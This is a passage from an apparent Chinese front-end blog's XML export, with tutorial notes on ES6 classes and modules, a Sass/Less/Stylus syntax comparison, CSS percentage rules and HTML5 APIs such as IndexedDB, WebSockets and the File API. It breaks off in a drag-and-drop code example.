&#125;Bar.classMethod() // &apos;hello&apos;//或class Bar extends Foo &#123; static classMethod() &#123; return super.classMethod() + &apos;, too&apos;; &#125; &#125;Bar.classMethod() // &quot;hello, too&quot; Class 的静态属性和实例属性静态属性指的是 Class 本身的属性。123class Foo &#123; &#125;Foo.prop = 1; Foo.prop // 1 类的实例属性类的实例属性可以用等式，写入类的定义之中。123456class MyClass &#123; myProp = 42; constructor() &#123; console.log(this.myProp); // 42 &#125; &#125; 类的静态属性类的静态属性只要在上面的实例属性写法前面，加上 static 关键字就可以了。123456class MyClass &#123; static myStaticProp = 42; constructor() &#123; console.log(MyClass.myStaticProp); // 42 &#125; &#125; new.target属性 该属性一般用在构造函数之中，返回 new 命令作用于的那个构造函数。如果构造函数不是通过 new 命令调用的， new.target 会返回 undefined ，因此这个属性可以用来确定构造函数是怎么调用的。 123456789function Person(name) &#123; if (new.target === Person) &#123; this.name = name; &#125; else &#123; throw new Error(&apos;必须使用 new 生成实例&apos;); &#125; &#125;var person = new Person(&apos;张三&apos;); // 正确 var notAPerson = Person.call(person, &apos;张三&apos;); // 报错 子类继承父类时， new.target 会返回子类。 在函数外部，使用 new.target 会报错。 Class 的继承简介 子类必须在 constructor 方法中调用 super 方法，否则新建实例时会报错。这是因为子类没有自己的 this 对象，而是继承父类的 this 对象，然后对其进行加工。 12345class Point &#123; /* ... */ &#125; class ColorPoint extends Point &#123; constructor() &#123; &#125; &#125;let cp = new ColorPoint(); // ReferenceError 如果子类没有定义 constructor 方法，这个方法会被默认添加。 1234567class ColorPoint extends Point &#123; &#125;// 等同于 class ColorPoint extends Point &#123; constructor(...args) &#123; super(...args); &#125; &#125; Object.getPrototypeOf()Object.getPrototypeOf 方法可以用来从子类上获取父类。12Object.getPrototypeOf(ColorPoint) === Point // true super 关键字super 这个关键字，既可以当作函数使用，也可以当作对象使用。 super 作为函数调用super 作为函数调用时，代表父类的构造函数。12345class A &#123;&#125; class B extends A &#123; constructor() &#123; super(); &#125; &#125; 作为函数时， super() 只能用在子类的构造函数之中，用在其他地方就会报错。123456class A &#123;&#125; class B extends A &#123; m() &#123; super(); // 报错 &#125; &#125; super 作为对象时super 作为对象时，在普通方法中，指向父类的原型对象；在静态方法中，指向父类。123456789101112class A &#123; p() &#123; return 2; &#125; &#125;class B extends A &#123; constructor() &#123; super(); console.log(super.p()); // 2 &#125; &#125;let b = new B(); 由于 super 指向父类的原型对象，所以定义在父类实例上的方法或属性，是无法通过 super 调用的。123456789101112class A &#123; constructor() &#123; this.p = 2; &#125; &#125;class B extends A &#123; get m() &#123; return super.p; &#125; &#125;let b = new B(); b.m // undefined 通过 super 调用父类的方法时， super 会绑定子类的 this 。12345678910111213141516171819class A &#123; constructor() &#123; this.x = 1; &#125; print() &#123; console.log(this.x); &#125; &#125;class B extends A &#123; constructor() &#123; super(); this.x = 2; &#125; m() &#123; super.print(); &#125; &#125;let b = new B(); b.m() // 2 类的 prototype 属性和proto属性 子类的 proto 属性，表示构造函数的继承，总是指向父类。 子类 prototype 属性的 proto 属性，表示方法的继承，总是指向父类的 prototype 属性。 1234class A &#123; &#125;class B extends A &#123; &#125;B.__proto__ === A // true B.prototype.__proto__ === A.prototype // true 原生构造函数的继承ECMAScript 的原生构造函数大致有下面这些。 Boolean() Number() String() Array() Date() Function() RegExp() Error() Object() ES6 允许继承原生构造函数定义子类，因为 ES6 是先新建父类的实例对象 this ，然后再用子类的构造函数修饰 this ，使得父类的所有行为都可以继承。下面是一个继承 Array 的例子。12345678910class MyArray extends Array &#123; constructor(...args) &#123; super(...args); &#125; &#125;var arr = new MyArray(); arr[0] = 12; arr.length // 1 arr.length = 0; arr[0] // undefined Mixin 模式的实现Mixin 模式指的是，将多个类的接口“混入”（mixin）另一个类。1234567891011121314151617181920function mix(...mixins) &#123; class Mix &#123;&#125; for (let mixin of mixins) &#123; copyProperties(Mix, mixin); copyProperties(Mix.prototype, mixin.prototype); &#125; return Mix; &#125;function copyProperties(target, source) &#123; for (let key of Reflect.ownKeys(source)) &#123; if ( key !== &quot;constructor&quot; &amp;&amp; key !== &quot;prototype&quot; &amp;&amp; key !== &quot;name&quot; ) &#123; let desc = Object.getOwnPropertyDescriptor(source, key); Object.defineProperty(target, key, desc); &#125; &#125; &#125;//使用class DistributedEdit extends mix(Loggable, Serializable) &#123;&#125; Module 的语法概述ES6 模块不是对象，而是通过 export 命令显式指定输出的代码，再通过 import 命令输入。 ES6 模块还有以下好处。 不再需要 UMD 模块格式了，将来服务器和浏览器都会支持 ES6 模块格式。目前，通过各种工具库，其实已经做到了这一点。 将来浏览器的新 API 就能用模块格式提供，不再必须做成全局变量或 者 navigator 对象的属性。 不再需要对象作为命名空间（比如 Math 对象），未来这些功能可以通过模块提供。 export 命令如果你希望外部能够读取模块内部的某个变量，就必须使用 export 关键字输出该变量。12345678910// profile.js export var firstName = &apos;Michael&apos;; export var lastName = &apos;Jackson&apos;; export var year = 1958;//orvar firstName = &apos;Michael&apos;; var lastName = &apos;Jackson&apos;; var year = 1958; export &#123;firstName, lastName, year&#125;; export 命令除了输出变量，还可以输出函数或类（class）。123export function multiply(x, y) &#123; return x * y; &#125;; 通常情况下， export 输出的变量就是本来的名字，但是可以使用 as 关键字重命名。1234567function v1() &#123; ... &#125; function v2() &#123; ... &#125; export &#123; v1 as streamV1, v2 as streamV2, v2 as streamLatestVersion &#125;; export 语句输出的接口，与其对应的值是动态绑定关系，即通过该接口，可以取到模块内部实时的值。12export var foo = &apos;bar&apos;; setTimeout(() =&gt; foo = &apos;baz&apos;, 500); import 命令 如果想为输入的变量重新取一个名字， import 命令要使用 as 关键字，将输入的变量重命名。 import 命令接受一对大括号，里面指定要从其他模块导入的变量名。 1import &#123; lastName as surname &#125; from &apos;./profile&apos;; import 命令具有提升效果，会提升到整个模块的头部，首先执行。 由于 import 是静态执行，所以不能使用表达式和变量 12345678910111213// 报错 import &#123; &apos;f&apos; + &apos;oo&apos; &#125; from &apos;my_module&apos;; // 报错 let module = &apos;my_module&apos;; import &#123; foo &#125; from module; // 报错 if (x === 1) &#123; import &#123; foo &#125; from &apos;module1&apos;; &#125; else &#123; import &#123; foo &#125; from &apos;module2&apos;; &#125; 如果多次重复执行同一句 import 语句，那么只会执行一次，而不会执行多次。12import &apos;lodash&apos;; import &apos;lodash&apos;; 模块的整体加载用星号（ * ）指定一个对象，所有输出值都加载在这个对象上面。123456789101112// circle.js export function area(radius) &#123; return Math.PI * radius * radius; &#125;export function circumference(radius) &#123; return 2 * Math.PI * radius; &#125;// main.jsimport * as circle from &apos;./circle&apos;; console.log(&apos;圆面积：&apos; + circle.area(4)); console.log(&apos;圆周长：&apos; + circle.circumference(14)); export default 命令 为模块指定默认输出，其他模块加载该模块时， import 命令可以为该匿名函数指定任意名字。 1234567// export-default.js export default function () &#123; console.log(&apos;foo&apos;); &#125;// import-default.js import customName from &apos;./export-default&apos;; customName(); // &apos;foo&apos; 一个模块只能有一个默认输出，因此 export default 命令只能使用一次。 export default 命令其实只是输出一个叫做 default 的变量，所以它后面不能跟变量声明语句。 export 与 import 的复合写法如果在一个模块之中，先输入后输出同一个模块， import 语句可以与 export 语句写在一起。12345export &#123; foo, bar &#125; from &apos;my_module&apos;;// 接口改名 export &#123; foo as myFoo &#125; from &apos;my_module&apos;; // 整体输出 export * from &apos;my_module&apos;; 模块的继承1234567891011// circleplus.jsexport * from &apos;circle&apos;; export var e = 2.71828182846; export default function(x) &#123; return Math.exp(x); &#125;// main.js import * as math from &apos;circleplus&apos;; import exp from &apos;circleplus&apos;; console.log(exp(math.e)); 跨模块常量如果想设置跨模块的常量（即跨多个文件），或者说一个值要被多个模块共享，可以采用下面的写法。123456789// constants.js 模块 export const A = 1; export const B = 3; export const C = 4; // test1.js 模块 import * as constants from &apos;./constants&apos;; console.log(constants.A); // 1 console.log(constants.B); // 3 import()简介 require 是运行时加载模块， require 到底加载哪一个模块，只有运行时才知道。 import 语句做不到这一点。 import() 函数，完成动态加载。 import() 类似于 Node 的 require 方法，区别主要是前者是异步加载，后者是 同步加载。 import() 返回一个 Promise 对象。 12345678const main = document.querySelector(&apos;main&apos;); import(`./section-modules/$&#123;someVariable&#125;.js`) .then(module =&gt; &#123; module.loadPageInto(main); &#125;) .catch(err =&gt; &#123; main.textContent = err.message; &#125;); 适用场合 按需加载: import() 可以在需要的时候，再加载某个模块。 条件加载：import() 可以放在 if 代码块，根据不同的情况，加载不同的模块。 动态的模块路径：import() 允许模块路径动态生成。 Module 的加载实现加载规则1&lt;script type=&quot;module&quot; src=&quot;foo.js&quot;&gt;&lt;/script&gt; ES6 模块与 CommonJS 模块的差异 CommonJS 模块输出的是一个值的拷贝，ES6 模块输出的是值的引用。 CommonJS 模块是运行时加载，ES6 模块是编译时输出接口。 Node 加载 在 Node 环境中，使用 import 命令加载 CommonJS 模块，Node 会自动将 module.exports 属性，当作模块的默认输出，即等同于 export default 。 12345678910// a.js module.exports = &#123; foo: &apos;hello&apos;, bar: &apos;world&apos; &#125;;// 等同于 export default &#123; foo: &apos;hello&apos;, bar: &apos;world&apos; &#125;; 采用 require 命令加载 ES6 模块时，ES6 模块的所有输出接口，会成为输入对象的属性。 1234567891011121314// es.js export let foo = &#123;bar:&apos;my-default&apos;&#125;; export &#123;foo as bar&#125;; export function f() &#123;&#125;; export class c &#123;&#125;; // cjs.js const es_namespace = require(&apos;./es&apos;); // es_namespace = &#123; // get foo() &#123;return foo;&#125; // get bar() &#123;return foo;&#125; // get f() &#123;return f;&#125; // get c() &#123;return c;&#125; // &#125; 循环加载“循环加载”（circular dependency）指的是， a 脚本的执行依赖 b 脚本，而 b 脚本的执行又依赖 a 脚本。 CommonJSCommonJS 模块的重要特性是加载时执行，即脚本代码在 require 的时候，就会全部执行。一旦出现某个模块被”循环加载”，就只输出已经执行的部分，还未执行的部分不会输出。1234567891011121314151617181920212223242526// a.jsexports.done = false; var b = require(&apos;./b.js&apos;); console.log(&apos;在 a.js 之中，b.done = %j&apos;, b.done); exports.done = true; console.log(&apos;a.js 执行完毕&apos;);// b.jsexports.done = false; var a = require(&apos;./a.js&apos;); console.log(&apos;在 b.js 之中，a.done = %j&apos;, a.done); exports.done = true; console.log(&apos;b.js 执行完毕&apos;);// main.jsvar a = require(&apos;./a.js&apos;); var b = require(&apos;./b.js&apos;); console.log(&apos;在 main.js 之中, a.done=%j, b.done=%j&apos;, a.done, b.do ne);$ node main.js 在 b.js 之中，a.done = false b.js 执行完毕 在 a.js 之中，b.done = true a.js 执行完毕 在 main.js 之中, a.done=true, b.done=true ES6 模块ES6加载的变量，都是动态引用 其所在的模块。只要引用存在，代码就能执行。12345678910111213141516171819202122// even.jsimport &#123; odd &#125; from &apos;./odd&apos; export var counter = 0; export function even(n) &#123; counter++; return n == 0 || odd(n - 1); &#125;// odd.js import &#123; even &#125; from &apos;./even&apos;; export function odd(n) &#123; return n != 0 &amp;&amp; even(n - 1); &#125;$ babel-node &gt; import * as m from &apos;./even.js&apos;; &gt; m.even(10); true &gt; m.counter 6&gt; m.even(20) true &gt; m.counter 17 ES6模块的转码它是一个垫片库（polyfill），可以在浏览器内加载 ES6 模块、AMD 模块和 CommonJS 模块，将其转为 ES5 格式。1234&lt;script src=&quot;system.js&quot;&gt;&lt;/script&gt;&lt;script&gt; System.import(&apos;./app.js&apos;); &lt;/script&gt;]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>JS</tag>
        <tag>ES6</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS3知识点梳理]]></title>
    <url>%2FCSS3%E7%9F%A5%E8%AF%86%E7%82%B9%E6%A2%B3%E7%90%86.html</url>
    <content type="text"><![CDATA[本文对CSS3核心知识点，做了思维导图，便于记忆梳理。]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SASS,LESS,Stylus哪家强]]></title>
    <url>%2FSASS-LESS-Stylus%E5%93%AA%E5%AE%B6%E5%BC%BA.html</url>
    <content type="text"><![CDATA[俗话说得好，“人靠衣装，佛靠金装”，对于一个页面来说，美观与否，CSS起着重大的作用，而随着越来越多的使用，CSS也暴露出不少缺陷： 语法不够强大，比如无法嵌套书写导致模块化开发中需要书写很多重复的选择器 没有变量和合理的样式复用机制，使得逻辑上相关的属性值必须以字面量的形式重复输出，导致难以维护 于是，CSS预处理器就诞生了。CSS预处理器用一种专门的编程语言，进行Web页面样式设计，然后再编译成正常的CSS文件，以供项目使用。CSS预处理器为CSS增加一些编程的特性，无需考虑浏览器的兼容性问题。本文将主要介绍 Sass、Less 和 Stylus 这三种 css 预处理器，并比较分析他们的区别。 Sass/Scss、Less、stylus是什么? Sass：Sass是一种动态样式语言，语法属于缩排语法，是最早也是最成熟的CSS预处理器，拥有ruby社区的支持和compass这一最强大的css框架，目前受LESS影响，已经进化到了全面兼容CSS的SCSS。 Less：Less也是一种动态样式语言. 受Sass影响较大,对CSS赋予了动态语言的特性，如变量，继承，运算， 函数。Less既可以在客户端上运行 (支持IE 6+, Webkit, Firefox)，也可在服务端运行(借助 Node.js)。 Stylus：2010年产生于node社区， 主要用来给Node项目进行CSS预处理支持，人气不如前两者Stylus被称为是一种革命性的新语言，提供一个高效、动态、和使用表达方式来生成CSS，以供浏览器使用。Stylus同时支持缩进和CSS常规样式书写规则。需要安装nodeStylus的语法花样多一些，它的文件扩展名是“.styl”，Stylus也接受标准的CSS语法，但是他也像Sass老的语法规则，使用缩进控制，同时Stylus也接受不带大括号({})和分号的语法。 Sass/Scss、Less、stylus的区别编译环境Sass的安装需要Ruby环境，是在服务端处理的，而Less是需要引入less.js来处理Less代码输出css到浏览器，也可以在开发环节使用Less，然后编译成css文件，直接放到项目中，也有 Less.app、SimpleLess、CodeKit.app这样的工具，也有在线编译地址。Stylus需要安装node，然后安装最新的stylus包即可使用。 变量声明Sass变量以 $ 符号开始，赋值像设置CSS属性那样。1234$width: 5em;#main &#123; width: $width;&#125; 编译为：123#main &#123; width: 5em;&#125; 变量支持块级作用域，嵌套规则内定义的变量只能在嵌套规则内使用（局部变量），不在嵌套规则内定义的变量则可在任何地方使用（全局变量）。将局部变量转换为全局变量可以添加 !global 声明。12345678#main &#123; $width: 5em !global; width: $width;&#125;#sidebar &#123; width: $width;&#125; 编译为：1234567#main &#123; width: 5em;&#125;#sidebar &#123; width: 5em;&#125; Less变量以 @ 符号开始，赋值像设置CSS属性那样。1234567@width: 10px;@height: @width + 10px;#header &#123; width: @width; height: @height;&#125; 编译为：1234#header &#123; width: 10px; height: 20px;&#125; 变量是延迟加载的，在使用前不一定要预先声明。在定义一个变量两次时，只会使用最后定义的变量，Less会从当前作用域中向上搜索。这个行为类似于CSS的定义中始终使用最后定义的属性值。12345678910@var: 0;.class &#123; @var: 1; .brass &#123; @var: 2; three: @var; @var: 3; &#125; one: @var;&#125; 编译为：123456.class &#123; one: 1;&#125;.class .brass &#123; three: 3;&#125; Stylus没有特殊的要求,可以使用 $ 符号开头。1234font-size = 14pxfont = font-size &quot;Lucida Grande&quot;, Arialbody font font, sans-serif 编译为：123body &#123; font: 14px &quot;Lucida Grande&quot;, Arial, sans-serif;&#125; 插值语句Sass通过 #{} 插值语句可以在选择器或属性名中使用变量。12345$name: foo;$attr: border;p.#&#123;$name&#125; &#123; #&#123;$attr&#125;-color: blue;&#125; 编译为:123p.foo &#123; border-color: blue; &#125; Less通过 {} 插值语句可以在选择器或属性名中使用变量。123456@mySelector: banner;.@&#123;mySelector&#125; &#123; font-weight: bold; line-height: 40px; margin: 0 auto;&#125; 编译为：12345.banner &#123; font-weight: bold; line-height: 40px; margin: 0 auto;&#125; StylusStylus支持通过使用{}字符包围表达式来插入值，其会变成标识符的一部分。12345678vendor(prop,args) -webkit-&#123;prop&#125; args -moz-&#123;prop&#125; args &#123;prop&#125; argsborder-radius() vendor(&apos;border-radius&apos;,arguments)button border-radius 1px 2px / 3px 4px 编译为：12345button &#123; -webkit-border-radius: 1px 2px / 3px 4px; -moz-border-radius: 1px 2px / 3px 4px; border-radius: 1px 2px / 3px 4px;&#125; 嵌套在嵌套上，三种选择器基本一致，没有太大区别。123456a &#123; font-weight: bold; text-decoration: none; &amp;:hover &#123; text-decoration: underline; &#125; body.firefox &amp; &#123; font-weight: normal; &#125;&#125; 编译为：12345678910a &#123; font-weight: bold; text-decoration: none; &#125;a:hover &#123; text-decoration: underline; &#125;body.firefox a &#123; font-weight: normal; &#125; Sass还提供一种属性嵌套功能。1234567.funky &#123; font: &#123; family: fantasy; size: 30em; weight: bold; &#125;&#125; 编译为：12345.funky &#123; font-family: fantasy; font-size: 30em; font-weight: bold; &#125; 继承Sass12345678910111213.error &#123; border: 1px #f00; background-color: #fdd;&#125;.attention &#123; font-size: 3em; background-color: #ff0;&#125;.seriousError &#123; @extend .error; @extend .attention; border-width: 3px;&#125; 编译为：1234567891011.error, .seriousError &#123; border: 1px #f00; background-color: #fdd; &#125;.attention, .seriousError &#123; font-size: 3em; background-color: #ff0; &#125;.seriousError &#123; border-width: 3px; &#125; Less1234567nav ul &#123; &amp;:extend(.inline); background: blue;&#125;.inline &#123; color: red;&#125; 编译为：1234567nav ul &#123; background: blue;&#125;.inline,nav ul &#123; color: red;&#125; Stylus123456789form input[type=text] padding: 5px border: 1px solid #eee color: #dddtextarea @extends form input[type=text] padding: 10px 编译为：123456789form input[type=text],textarea &#123; padding: 5px; border: 1px solid #eee; color: #ddd;&#125;textarea &#123; padding: 10px;&#125; 混入 (Mixins)Sass123456789@mixin sexy-border($color, $width: 1in) &#123; border: &#123; color: $color; width: $width; style: dashed; &#125;&#125;p &#123; @include sexy-border(blue); &#125;h1 &#123; @include sexy-border(blue, 2in); &#125; 编译为：12345678910p &#123; border-color: blue; border-width: 1in; border-style: dashed; &#125;h1 &#123; border-color: blue; border-width: 2in; border-style: dashed; &#125; Less12345678910.my-mixin &#123; color: black;&#125;.my-other-mixin() &#123; background: white;&#125;.class &#123; .my-mixin; .my-other-mixin;&#125; 编译为：1234567.my-mixin &#123; color: black;&#125;.class &#123; color: black; background: white;&#125; Stylus123456border-radius(n) -webkit-border-radius n -moz-border-radius n border-radius nform input[type=button] border-radius(5px) 编译为：12345form input[type=button] &#123; -webkit-border-radius: 5px; -moz-border-radius: 5px; border-radius: 5px;&#125; @import三种语言基本一致。1234@import &quot;foo.css&quot;;@import &quot;foo&quot; screen;@import &quot;http://foo.com/bar&quot;;@import url(foo); Sass还提供一种分音。如果需要导入 SCSS 或者 Sass 文件，但又不希望将其编译为 CSS，只需要在文件名前添加下划线，这样会告诉 Sass 不要编译这些文件，但导入语句中却不需要添加下划线。12//将文件命名为 _colors.scss，便不会编译 _colours.css 文件。@import &quot;colors&quot;; 输出设置Sass 提供了四种输出格式，可以通过 :style option 选项设定，或者在命令行中使用 –style 选项。 :nested：Nested （嵌套）样式，默认的输出格式。选择器与属性等单独占用一行，缩进量与 Sass 文件中一致，每行的缩进量反映了其在嵌套规则内的层数。 :expanded：输出更像是手写的样式，选择器、属性等各占用一行，属性根据选择器缩进，而选择器不做任何缩进。 :compact：每条 CSS 规则只占一行，包含其下的所有属性。嵌套过的选择器在输出时没有空行，不嵌套的选择器会输出空白行作为分隔符。 :compressed：删除所有无意义的空格、空白行、以及注释，力求将文件体积压缩到最小，同时也会做出其他调整，比如会自动替换占用空间最小的颜色表达方式。 控制指令Sass123456789101112$type: monster;p &#123; @if $type == ocean &#123; color: blue; &#125; @else if $type == matador &#123; color: red; &#125; @else if $type == monster &#123; color: green; &#125; @else &#123; color: black; &#125;&#125; 编译为：123p &#123; color: green; &#125; Less在1.5.0以前，使用 when 的语法。123456.my-optional-style() when (@my-option = true) &#123; button &#123; color: white; &#125;&#125;.my-optional-style(); 1.5.0以后也可以使用 &amp; when 的方式模拟 if 。12345678&amp; when (@my-option = true) &#123; button &#123; color: white; &#125; a &#123; color: blue; &#125;&#125; 也可以使用 if 。123456789@dr: if(@my-option = true, &#123; button &#123; color: white; &#125; a &#123; color: blue; &#125;&#125;);@dr(); Stylus更接近Sass。123456overload-padding = trueif overload-padding padding(y, x) margin y xbody padding 5px 10px 总结 Sass的优势得益于对函数和库的支持，但是因为基于Ruby环境，并不是特别友好。 Less相对清晰，也更接近CSS本身的写法，由于受Sass的极大的影响，我们也能看到，其中一些长期被开发者诟病的写法也得到了改善，对于Less的前景还是相对看好的。 Stylus可以说是集合了Sass和Less的优点，并进行极大的自由化，虽然目前Stylus的使用程度不如前两者广泛，但是鉴于其基于Node环境，语法大多参考Sass，在未来将是一个十分有生命力的CSS预处理器。 参考链接：浅谈css预处理器，Sass、Less和Stylus-知乎关于sass（scss）、less、postcss、stylus等的用法与区别-掘金]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>LESS</tag>
        <tag>SASS</tag>
        <tag>Stylus</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS中的百分比计算]]></title>
    <url>%2FCSS%E4%B8%AD%E7%9A%84%E7%99%BE%E5%88%86%E6%AF%94%E8%AE%A1%E7%AE%97.html</url>
    <content type="text"><![CDATA[CSS布局中会用到很多百分比，但他们究竟都是如何计算的呢，你可能一个不小心就会把他们混淆在一起，所以这里就对CSS中所有可以用到百分比的属性做一个总结，方便更加系统的理解和记忆。 font-size根据元素字体大小，当前大小为100% line-height根据元素字体大小，当前大小为100% translate根据元素大小，当前大小为100% width 正常文档流和浮动：百分比相对于父元素content-box 绝对定位：百分比相对于父元素padding-box height 正常文档流和浮动：百分比相对于父元素content-box 绝对定位：百分比相对于父元素padding-box 当父元素高度为auto：子元素高度百分比会被忽略 margin 正常文档流和浮动：百分比相对于父元素的content-box宽度 绝对定位：百分比相对于父元素的padding-box宽度 padding 正常文档流和浮动：百分比相对于父元素的content-box宽度 绝对定位：百分比相对于父元素的padding-box宽度 top/bottom/left/right 非定位元素：无效果 相对定位： top和bottom百分比是相对父元素的content-box高度，left和right百分比是相对父元素的content-box宽度 绝对定位：top和bottom百分比是相对最近一级非static定位父元素的padding-box高度，left和right百分比是相对最近一级非static定位父元素的padding-box宽度]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTML5知识点]]></title>
    <url>%2FHTML5%E7%9F%A5%E8%AF%86%E7%82%B9.html</url>
    <content type="text"><![CDATA[最近阅读了HTML5权威指南，给HTML5中新增的知识点做了张思维导图，方便二次记忆和梳理。 针对其中部分知识点，已做举例补充。 有关Canvas部分的知识点不包括在内，将作为一个单独的专题进行梳理。 思维导图 History API作用用于在不刷新页面的前提下，通过脚本语言的方式来进行页面上某块局部内容的更新。 基本语法1history.pushState(state,null,&quot;edit.php?id=&quot;+id); 事件处理1234window.addEventListener(&quot;popstate&quot;,function(e)&#123; if(e.state) loadPage(e.state.userType,e.state.id);&#125;); 本地存储Web StoragesessionStorage 解释：数据保存在session对象中。 方法：123456789//setItem()sessionStorage.setItem(&apos;key&apos;,&apos;value&apos;);//orsessionStorage.key = value;//getItem()var val = sessionStorage.getItem(&apos;key&apos;);//orvar val = sessionStorage.key; localStorage 解释：数据保存在客户端本地的硬件设备中。 方法：123456789//setItem()localStorage.setItem(&apos;key&apos;,&apos;value&apos;);//orlocalStorage.key = value;//getItem()var val = localStorage.getItem(&apos;key&apos;);//orvar val = localStorage.key; storage事件123window.addEventListener(&apos;storage&apos;,function(event)&#123; //sessionStorage或localStorage的值发生变动时所要执行的处理&#125;,false); event.key：在session或localStorage中被修改的数据键值 event.oldValue：在session或localStorage中被修改前的值 event.newValue：在session或localStorage中被修改后的值 event.url：修改session或localStorage的页面的URL地址 event.storageArea：改动的为session或localStorage 本地数据库SQLLite123456var db = openDatabase(&apos;mydb&apos;,&apos;1.0&apos;,&apos;Test DB&apos;,2*1024*1024);db.transaction(function(tx)&#123; tx.executeSql(&apos;INSET INTO MsgData VALUES(?,?,?)&apos;,[name,message,time], function(tx,rs)&#123;&#125;, function(tx,error)&#123;&#125;);&#125;); indexedDB123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566//兼容浏览器window.indexedDB = window.indexedDB || window.webkitIndexedDB || window.mozIndexedDB || window.msIndexedDB;window.IDBTransaction = window.IDBTransaction || window.webkitIDBTransaction || window.msIDBTransaction;window.IDBKeyRange = window.IDBKeyRange || window.webkitIDBKeyRange || window.msIDBKeyRange;window.IDBCursor = window.IDBCursor || window.webkitIDBCursor || window.msIDBCursor;//连接数据库var dbName = &apos;indexedDBTest&apos;;var dbVersion = 20190824;var idb;var dbConnect = indexedDB.open(dbName,dbVersion);dbConnect.onsuccess = function(e)&#123; idb = e.target.result; //开启事务 var tx = idb.transaction([&apos;Users&apos;],&quot;readwrite&quot;); var store = tx.objectStore(&apos;User&apos;); //保存数据 var value = &#123; userId:1, userName: &apos;张三&apos;, address: &apos;住址&apos; &#125;; var req = store.put(value); //会覆盖 //or var req = store.add(value); //不会覆盖 req.oncomplete = function(e)&#123;&#125;; req.onabort = function(e)&#123;&#125;; //获取数据 var req = store.get(1); var idx = store.index(&apos;userNameIndex&apos;); var req = idx.get(&apos;张三&apos;); //根据索引检索 var range = IDBKetRange.bound(&apos;用户A&apos;,&apos;用户D&apos;); var direction = &quot;next&quot;; var req = idx.openCursor(range,direction); //统计对象数据数量 var req = store.count();&#125;dbConnect.onerror = function(e)&#123;&#125;dbConnect.onupgradeneeded = function(e)&#123; idb = e.target.result; //创建仓库 var tx = e.target.transaction; var name = &apos;User&apos;; var optionalParameters = &#123; keyPath: &apos;userId&apos;, autoIncrement: false &#125;; var store = idb.createObjectStore(name,optionalParameters); //创建索引 var name = &apos;userNameIndex&apos;; var keyPath = &apos;userName&apos;; var optionalParameters = &#123; unique: false, multiEntry: false &#125;; var idx = store.createIndex(name,keyPath,optionalParameters);&#125;; 离线存储manifest文件列举了需要被缓存或不需要被缓存的资源文件的名称，以及这些资源文件的访问路径。 applicationCache对象事件1234567applicationCache.onchecking = function(e)&#123;&#125;;applicationCache.onnoupdate = function(e)&#123;&#125;;applicationCache.ondownloading = function(e)&#123;&#125;;applicationCache.onprogress = function(e)&#123;&#125;;applicationCache.onUpdateReady = function(e)&#123;&#125;;applicationCache.oncached = function(e)&#123;&#125;;applicationCache.onerror = function(e)&#123;&#125;; swapCache立即更新本地缓存。 文件APIFileList对象与file对象1234var file;for(var i = 0;i&lt;document.geElementById(&quot;file&quot;).files.length;i++)&#123; file = document.getElementById(&quot;file&quot;).files[i];&#125; ArrayBuffer用于二进制数据缓存字符串。1var buf = new ArrayBuffer(32); ArrayBufferView对象1var Int32Array = new Int32Array(ArrayBuffer); DataView对象1var view = new DataView((uffer,byteOffset,byteLength); Blob对象12var blob = new Blob ([blobParts,type]);var newBlob = blob.slice(start,end,contentType); FileReader对象用来把文件读入内存，并且读取文件中的数据。 方法 readAsText：以文本方式读取，读取的结果即这个文本文件中的内容 readAsBinaryString：读取为二进制字符串 readAsDataURL：读取一串Data URL字符串 readyArrayBuffer：读取为一个ArrayBuffer 事件 onabort() onprogress() onerror() onload() onloadstart() onloadend() FileSystem API用于用户需要永久保存数据，但是本地数据库的利用不能满足用户需求。 适用场合 文件分段上传 在视频游戏或其他使用大量与媒体数据相关的应用程序中 在离线或使用本地缓存的音频编辑或图片编辑应用程序中 离线视频播放器 离线邮件客户端 基本操作 请求访问文件系统：window.requestFileSystem(type,size,successCallback,opt_errorCallback) 申请磁盘配额：window.webkitStorageInfo.requestQuota(PERSISTENT,1024*1024,successHandler,errorHandler) 创建文件：fs.root.getFile(filename,{create:true},successHandler,errorHandler) 写入文件：fileEntry.createWriter(successHandler,errorHandler) 在文件中追加数据：fileWriter.seek(fileWrer.length) 读取文件：fileEntry.file(successHandler,errorHandler) 复制磁盘中的文件：fileWriter.write(file); 删除文件：fileEntry.remove(successHandler,errorHandler) 创建目录：fs.root.getDirectory(path,{create:true},successHandler,errorHandler) 读取目录中的内容：fs.root.createReader().readEntries(successHandler,errorHandler) 删除目录：dirEntry.remove(successHandler,errorHandler) 复制文件或目录：fileEntry.copyTo(parent,newName,successHandler,errorHandler) 移动文件或目录与重命名文件或目录：fileEntry.moveTo(parent,newName,successHandler,errorHandler) Base64编码支持 理解为二进制：window.btoa 理解为ASCII码：window.atob 通信 API跨文本信息传输12window.addEventListener(&quot;message&quot;,function()&#123;...&#125;,false);otherWindow.postMessage(message,targetOrigin); WebSockets实现方法12345var webSocket = new WebSocket(&quot;ws://localhost:8005/socket&quot;);webSocket.send(&quot;data&quot;);webSocket.onmessage = function(event)&#123;&#125;;webSocket.onopen = function(event)&#123;&#125;;webSocket.onclose = function(event)&#123;&#125;; 发送对象1234webSocket.send(JSON.stringify(&#123; result: successFlag, time: currentTime&#125;)); 适用场景 多人在线游戏网站 聊天室 实时体育或新闻评论网站 实时交互用户信息的社交网站 Server-Sent Events API适用场景 在股票软件中实时显示股票的在线数据 在新闻网站中实时显示最近刚刚发生的重大新闻 在在线聊天软件中实时显示当前聊天室中的用户名及用户人数 在其他任何需要实时显示服务端数据的场合 实现方法12345var source = new EventSource(&quot;test.php&quot;,&#123;withCredentials:true&#125;);source.close();source.onmessage = function(e)&#123;&#125;;source.onopen = function(e)&#123;&#125;;source.onerror = function(e)&#123;&#125;; 拖放 API1234567891011121314151617181920212223242526272829303132333435var target = document.querySelector(&apos;#drop-target&apos;);var dragElements = document.querySelectorAll(&apos;#drag-elements li&apos;);// 追踪被拖动元素的变量var elementDragged = null;for (var i = 0; i &lt; dragElements.length; i++) &#123; 